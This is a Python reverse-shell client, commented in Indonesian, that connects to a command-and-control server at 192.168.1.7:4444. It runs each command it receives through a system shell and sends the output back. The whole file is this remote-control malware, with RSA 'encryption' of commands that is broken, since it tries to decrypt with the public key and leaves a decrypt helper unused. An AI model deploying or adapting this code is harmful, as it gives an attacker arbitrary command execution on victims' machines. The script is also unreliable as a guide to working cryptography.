import socket
import subprocess
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

# Konfigurasi IP dan port server Command and Control (C2)
ip = "192.168.1.7"  # Alamat IP server C2
port = 4444         # Port yang digunakan untuk komunikasi dengan server C2

# Membuat socket menggunakan protokol TCP/IP
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))  # Menghubungkan socket ke server C2 menggunakan IP dan port yang ditentukan

# Menerima kunci publik dari server
public_key_pem = s.recv(2048).decode()  # Menerima data kunci publik dalam format PEM
print("[*] Received public key: {}".format(public_key_pem))
public_key = RSA.import_key(public_key_pem)  # Mengimpor kunci publik ke dalam format RSA

# Fungsi untuk mengenkripsi data menggunakan algoritma RSA
def rsa_encrypt(data, public_key):
    # Membuat objek cipher RSA dengan padding OAEP
    cipher = PKCS1_OAEP.new(public_key)
    return cipher.encrypt(data.encode())  # Mengenkripsi data (yang dikonversi ke byte) dan mengembalikannya

# Fungsi untuk mendekripsi data menggunakan algoritma RSA
def rsa_decrypt(data, private_key):
    # Membuat objek cipher RSA dengan padding OAEP
    cipher = PKCS1_OAEP.new(private_key)
    return cipher.decrypt(data).decode()  # Mendekripsi data dan mengembalikannya dalam bentuk string

# Loop utama untuk menerima perintah dari server dan mengeksekusinya
while True:
    # Menerima perintah terenkripsi dari server
    encrypted_command = s.recv(256)  # Membaca data perintah yang telah dienkripsi dari server
    cipher = PKCS1_OAEP.new(public_key)  # Membuat objek cipher RSA dengan kunci publik
    command = cipher.decrypt(encrypted_command).decode()  # Mendekripsi perintah
    print("[*] Received command: {}".format(command))

    # Jika perintah adalah "exit", keluar dari loop dan hentikan program
    if command.lower() == "exit":
        break

    # Eksekusi perintah yang diterima
    try:
        # Menjalankan perintah shell menggunakan `subprocess.check_output`
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        # Mengirimkan output hasil eksekusi kembali ke server
        s.sendall(output)
    except Exception as e:
        # Jika terjadi kesalahan saat eksekusi, kirim pesan kesalahan ke server
        s.sendall(str(e).encode())

# Menutup koneksi setelah keluar dari loop
s.close()
